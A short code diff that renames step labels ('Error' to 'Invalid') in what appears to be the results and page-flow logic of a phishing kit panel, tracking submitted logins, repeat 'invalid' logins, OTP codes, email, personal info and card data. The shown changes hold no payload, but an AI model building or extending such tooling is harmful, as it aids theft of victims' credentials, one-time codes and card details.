@@ -718,9 +718,9 @@ function resultSessions(results = []) {
 
 const resultStepDefinitions = [
   ["login", "Login submitted"],
-  ["login2", "Error login submitted"],
+  ["login2", "Invalid login submitted"],
   ["otp", "OTP submitted"],
-  ["otp2", "Error OTP submitted"],
+  ["otp2", "Invalid OTP submitted"],
   ["email", "Email submitted"],
   ["personal", "Personal info submitted"],
   ["card", "Card submitted"],
@@ -1336,7 +1336,7 @@ function canonicalRuntimeFlowTargets(page, discoveredFiles = []) {
   const targets = [];
   [
     ["Login", "index.html"],
-    ["Error Login", "login2.html"],
+    ["Invalid Login", "login2.html"],
     ["OTP", "otp.html"],
     ["Email", "email.html"],
     ["Personal", "personal.html"],
@@ -1347,9 +1347,9 @@ function canonicalRuntimeFlowTargets(page, discoveredFiles = []) {
   });
 
   if (hasFile("otp2.html")) {
-    targets.splice(Math.min(targets.findIndex((target) => target.file.toLowerCase() === "otp.html") + 1 || 3, targets.length), 0, makeTarget("Error OTP", byFile.get("otp2.html")));
+    targets.splice(Math.min(targets.findIndex((target) => target.file.toLowerCase() === "otp.html") + 1 || 3, targets.length), 0, makeTarget("Invalid OTP", byFile.get("otp2.html")));
   } else if (hasFile("otp.html")) {
-    targets.splice(Math.min(targets.findIndex((target) => target.file.toLowerCase() === "otp.html") + 1 || 3, targets.length), 0, makeTarget("Error OTP", byFile.get("otp.html"), {
+    targets.splice(Math.min(targets.findIndex((target) => target.file.toLowerCase() === "otp.html") + 1 || 3, targets.length), 0, makeTarget("Invalid OTP", byFile.get("otp.html"), {
       forceReload: true,
       fallbackFor: "otp2.html"
     }));
